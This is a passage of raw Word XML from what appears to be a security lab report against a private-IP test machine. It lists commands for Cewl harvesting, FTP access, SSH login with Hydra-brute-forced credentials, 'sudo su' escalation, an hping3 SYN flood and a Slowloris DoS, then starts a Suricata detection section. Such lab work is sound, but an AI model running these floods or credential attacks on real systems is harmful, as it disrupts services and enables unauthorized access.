    <w:p w14:paraId="730F5858" w14:textId="6D450807" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t>Try manually logging into the target system via SSH using the credentials found through brute-forcing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBD142B" w14:textId="5DFA41D9" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">3.4. Username Harvesting with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Cewl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (not working)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BB7430" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t>Cewl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve"> is a tool for gathering potential usernames from a website by scraping content.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0065229E" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve">Harvest Usernames from a Website: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EDBE52" w14:textId="5A9F97E5" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t>cewl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve"> http://192.168.1.10 -d </w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve"> -w usernames.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2755A6E2" w14:textId="24F0F562" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r>
        <w:t>4.</w:t>
      </w:r>
      <w:r w:rsidR="00DD27AB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B14B500" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Objective: Exploit vulnerabilities to gain access or execute actions on the target system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24708F4D" w14:textId="1BEFEBA5" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D364FB2" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4.1. FTP Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779C2784" w14:textId="0B226FB0" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:r w:rsidRPr="00170A90">
        <w:t>FTP can be exploited by uploading files to the target system or by gaining access with weak credentials. Obtained with hydra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA4FA93" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Upload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> Files </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> FTP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F4B233" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ftp 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9FFF84" w14:textId="35B06470" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t>put file.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E5A87D" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Download</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> Files </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> FTP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B36CB2" w14:textId="63C39F3D" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ile.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5DA4C2" w14:textId="62C0CF9C" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76868AE1" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4.2. SSH Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228AC2DD" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:r w:rsidRPr="00170A90">
        <w:t>SSH is another method to gain remote access to a system. If you obtained valid SSH credentials using Hydra, you can attempt to log in remotely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40626C21" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">SSH </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADB11A5" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t xml:space="preserve">Using the credentials obtained from Hydra, log into the victim machine via SSH: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6140B0BE" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> msfadmin@192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C96602" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t>Once logged in, you will have access to the remote system's shell and can execute commands.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5B0D4E" w14:textId="160A23CB" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t>Exploitation with Privilege Escalation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464E2104" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">You can use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:t xml:space="preserve"> to escalate privileges if the user has the right permissions: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E55602F" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="000A7842" w:rsidRDefault="00170A90" w:rsidP="00DD27AB">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="000A7842">
        <w:t>sudo su</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C57BAB8" w14:textId="1E0BF099" w:rsidR="00170A90" w:rsidRPr="000A7842" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CA32844" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4.3. DDoS Exploitation with hping3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4CA99F" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:r w:rsidRPr="00170A90">
        <w:t>You can simulate a Distributed Denial of Service (DDoS) attack using hping3 to flood the target system with traffic and potentially cause a service disruption.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A14086A" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t>Flood Port 80 with SYN Packets:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D938135" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>hping3 -S --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>flood</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p 80 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E1E46D" w14:textId="24AF665E" w:rsidR="00170A90" w:rsidRPr="00DD27AB" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t xml:space="preserve">This command sends a flood of SYN packets to port 80 (HTTP), attempting to flood </w:t>
      </w:r>
      <w:r w:rsidR="00DD27AB">
        <w:t>the target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B2072B" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00170A90" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76051C3C" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">4.4. HTTP Exploitation with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3D1926B4" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:t xml:space="preserve"> is a tool used to launch HTTP denial-of-service (DoS) attacks by keeping connections open and consuming server resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EE9971" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00DD27AB">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Launch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Attack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA3AE92" w14:textId="77777777" w:rsidR="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1440"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.10 -p 80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF041A5" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00170A90" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1440"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68F41360" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Summary</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>of</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Exploitation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Techniques</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7698395E" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t>FTP: Upload and download files, test weak credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DDAFC7" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t>SSH: Log in with credentials obtained from Hydra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BAD3D08" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t>DDoS: Use hping3 to perform a DoS attack on HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400B50A5" w14:textId="77777777" w:rsidR="00170A90" w:rsidRPr="00170A90" w:rsidRDefault="00170A90">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:t xml:space="preserve">HTTP: Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:t xml:space="preserve"> to exhaust server resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5569810F" w14:textId="0C4D95A7" w:rsidR="00840470" w:rsidRPr="00995558" w:rsidRDefault="00840470" w:rsidP="00840470">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r>
        <w:t>Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A010381" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Footprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="03F02DE1" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">1.1 WHOIS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Lookup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="301CC530" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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5AC5A1F8" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>whois 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F81D564" w14:textId="34FB421D" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>This action cannot be detected by Suricata.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AC4595" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">1.2 Ping </w:t>
      </w:r>
